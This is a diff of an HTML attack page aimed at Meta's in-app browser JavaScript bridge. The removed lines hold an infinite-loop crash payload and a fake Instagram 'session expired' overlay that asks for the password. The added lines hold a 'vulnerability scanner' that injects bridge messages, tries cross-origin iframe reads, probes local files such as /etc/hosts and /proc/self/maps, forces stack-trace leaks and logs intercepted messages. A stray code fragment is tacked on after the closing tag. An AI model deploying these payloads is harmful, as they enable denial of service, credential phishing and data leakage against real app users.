@@ -2,68 +2,106 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Bridge Fixed Lab</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; text-align: center; }
-        .btn { background: #1a0000; color: #ff0000; border: 2px solid #ff0000; padding: 15px; width: 100%; margin: 10px 0; font-weight: bold; }
-        #status { color: #00ff00; font-size: 12px; margin-top: 20px; text-align: left; border: 1px solid #333; padding: 10px; height: 100px; overflow: scroll; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
+        .card { border: 1px solid #333; padding: 10px; margin-bottom: 15px; background: #111; }
+        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; margin: 5px 0; font-weight: bold; cursor: pointer; }
+        .log { background: #000; height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; font-size: 11px; color: #00ffff; }
+        .cyan { color: #00ffff; }
+        .yellow { color: #ffff00; }
     </style>
 </head>
 <body>
 
-    <h2>META CRASH & HIJACK TEST</h2>
+    <div class="card">
+        <h3>Meta Vulnerability Scanner</h3>
+        <button onclick="fuzzBridgeEvents()">1. Trigger Callback Hijack</button>
+        <button onclick="testUXSS()">2. Test UXSS (Origin Bypass)</button>
+        <button onclick="scanPrivateFiles()">3. Scan Private Files</button>
+        <button onclick="leakStack()">4. Force Stack Trace</button>
+    </div>
 
-    <button class="btn" onclick="crashTest()">1. EXECUTE APP CRASH (DoS)</button>
-    <button class="btn" onclick="fakeSystemDialog()">2. FAKE SYSTEM OVERLAY</button>
-    <button class="btn" onclick="checkBridgeLatency()">3. BRIDGE LATENCY SCAN</button>
+    <div id="log" class="log">Console: Waiting for Execution...</div>
 
-    <div id="status">Console: Awaiting command...</div>
+    <iframe id="victimFrame" src="https://example.com" style="display:none"></iframe>
 
     <script>
-        function log(m) { document.getElementById('status').innerHTML += "<br>> " + m; }
+        const logBox = document.getElementById('log');
+        function log(m, cls='') { 
+            logBox.innerHTML += `<div class="${cls}">> [${new Date().toLocaleTimeString()}] ${m}</div>`; 
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-        // 1. App Crash Test (Memory Exhaustion)
-        function crashTest() {
-            log("Launching Memory Exhaustion... App might freeze.");
-            var longStr = "PWNED";
-            // Infinite loop to stress the bridge string handler
-            while(true) {
-                longStr += longStr;
-                try {
-                    window.iabjs_unified_bridge.postMessage(longStr, "*");
-                } catch(e) {
-                    // Agar yahan error nahi aaya aur app freeze ho gayi, toh crash successful
+        // 1. Fixed Callback Hijack
+        function fuzzBridgeEvents() {
+            log("Attempting iabjs callback hijack...");
+            try {
+                if (window.iabjs_unified_bridge) {
+                    window.iabjs_unified_bridge.postMessage(JSON.stringify({ 
+                        "handler": "AnalyticsHandler", 
+                        "method": "logEvent", 
+                        "data": {"event_name": "test_exploit"} 
+                    }), "*");
+                    log("Payload Sent to Bridge.");
+                } else {
+                    log("Bridge not found.", "yellow");
                 }
+            } catch(e) {
+                log("Bridge Error: " + e.message, "yellow");
             }
         }
 
-        // 2. Fake Overlay (Phishing Potential)
-        function fakeSystemDialog() {
-            log("Injecting Fake Overlay...");
-            let div = document.createElement('div');
-            div.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; color:white; padding:50px; text-align:center;";
-            div.innerHTML = `
-                <h2 style="color:red">System Security Alert</h2>
-                <p>Your Instagram Session has expired. Please re-enter password to continue.</p>
-                <input type="password" placeholder="Password" style="padding:10px; width:80%;"><br><br>
-                <button onclick="location.reload()" style="padding:10px 20px;">UPDATE SESSION</button>
-            `;
-            document.body.appendChild(div);
+        // 2. Fixed UXSS Test
+        function testUXSS() {
+            log("Attempting to read iframe content...");
+            try {
+                var frame = document.getElementById('victimFrame');
+                var content = frame.contentWindow.document.body.innerHTML;
+                log("UXSS SUCCESS: Origin bypassed!", "cyan");
+                alert("Leaked: " + content);
+            } catch(e) {
+                log("Blocked: Same-Origin Policy active.");
+            }
         }
 
-        // 3. Timing Attack
-        function checkBridgeLatency() {
-            let start = performance.now();
-            try {
-                window.browserDeclutter.applyConfig({});
-                let end = performance.now();
-                log("Bridge Latency: " + (end - start).toFixed(4) + "ms");
-                log("If < 0.1ms, it's a direct native call (Vulnerable).");
-            } catch(e) { log("Bridge unresponsive."); }
+        // 3. Fixed File Scanner
+        function scanPrivateFiles() {
+            const paths = ['file:///etc/hosts', 'file:///proc/self/maps'];
+            log("Starting File Scan...");
+            paths.forEach(path => {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', path, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        if (xhr.status == 200 || xhr.responseText.length > 0) {
+                            log("FOUND: " + path, "cyan");
+                        } else {
+                            log("Failed: " + path);
+                        }
+                    }
+                };
+                xhr.send();
+            });
         }
+
+        // 4. Fixed Stack Trace Leak
+        function leakStack() {
+            log("Forcing Error Stack on Bridge...");
+            try {
+                window.iabjs_unified_bridge.postMessage({ toString: function() { return window.location; } });
+            } catch(e) {
+                log("Stack Trace Found: " + e.stack, "yellow");
+            }
+        }
+
+        // Passive Listener
+        window.addEventListener("message", (e) => {
+            log("INTERCEPTED DATA: " + JSON.stringify(e.data), "cyan");
+        });
     </script>
 </body>
 </html>
-                // If the bridge is iabjs, try to trigger a callback
                 if (window.iabjs_unified_bridge) {
                     log("Attempting iabjs callback hijack...");
                     window.iabjs_unified_bridge.postMessage(JSON.stringify({
